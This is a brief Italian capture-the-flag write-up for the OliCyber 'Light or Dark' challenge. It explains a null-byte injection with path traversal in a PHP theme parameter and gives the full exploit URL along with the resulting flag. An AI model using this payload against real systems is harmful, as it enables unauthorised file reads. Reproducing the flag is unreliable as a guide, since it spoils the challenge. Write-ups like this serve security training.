# Light or Dark

http://lightdark.challs.olicyber.it/

## Spiegazione

Si fa nullbyte injection che a quanto pare funziona solo su vecchie versioni di PHP (tipo 4.x)ù


Il payload sarebbe ```http://lightdark.challs.olicyber.it/index.php?tema=/.../.../.../.../.../.../.../.../flag.txt%00.css```

E la flag si può trovare nello ```<style>flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}</style>```

